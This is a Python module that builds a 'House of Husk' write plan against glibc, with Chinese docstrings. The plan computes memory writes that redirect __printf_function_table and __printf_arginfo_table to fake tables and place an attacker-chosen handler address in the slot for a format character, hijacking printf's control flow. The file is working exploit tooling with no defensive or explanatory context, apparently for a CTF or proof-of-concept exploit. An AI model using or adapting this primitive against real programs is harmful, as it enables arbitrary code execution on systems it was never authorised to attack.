"""House of Husk printf handler table target plan."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64
SLOT_SIZE = 8
DEFAULT_SLOT_BIAS = 2


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_husk(
    *,
    printf_function_table_addr: int,
    printf_arginfo_table_addr: int,
    function_table_data_addr: int,
    arginfo_table_data_addr: int,
    format_char: int,
    handler_addr: int,
    slot_bias: int = DEFAULT_SLOT_BIAS,
) -> tuple[MemoryWrite, ...]:
    """生成两张 printf handler 表的目标写入计划。

    printf_function_table_addr/printf_arginfo_table_addr: 目标 libc
        全局表指针地址，必须按 Build ID 解析。
    function_table_data_addr/arginfo_table_data_addr: 两张伪表的
        实际可写地址。
    format_char: 被触发的格式字符 ASCII 值，例如 `ord('X')`。
    handler_addr: 伪表中对应槽位的回调地址。
    slot_bias: glibc 表索引偏移；按 PoC 默认是 2。
    """

    for name, value in {
        "printf_function_table_addr": printf_function_table_addr,
        "printf_arginfo_table_addr": printf_arginfo_table_addr,
        "function_table_data_addr": function_table_data_addr,
        "arginfo_table_data_addr": arginfo_table_data_addr,
        "handler_addr": handler_addr,
    }.items():
        _check_uint64(name, value)

    if format_char < 0 or format_char >= 256:
        raise ValueError("invalid format character")
    if slot_bias < 0:
        raise ValueError("invalid slot bias")

    slot = format_char - slot_bias
    if slot < 0:
        raise ValueError("format character precedes table bias")

    arg_slot_addr = arginfo_table_data_addr + slot * SLOT_SIZE

    return (
        MemoryWrite(
            printf_function_table_addr,
            _pack64(function_table_data_addr),
            "__printf_function_table",
        ),
        MemoryWrite(
            printf_arginfo_table_addr,
            _pack64(arginfo_table_data_addr),
            "__printf_arginfo_table",
        ),
        MemoryWrite(
            arg_slot_addr,
            _pack64(handler_addr),
            f"arginfo table slot {format_char:#x}",
        ),
    )
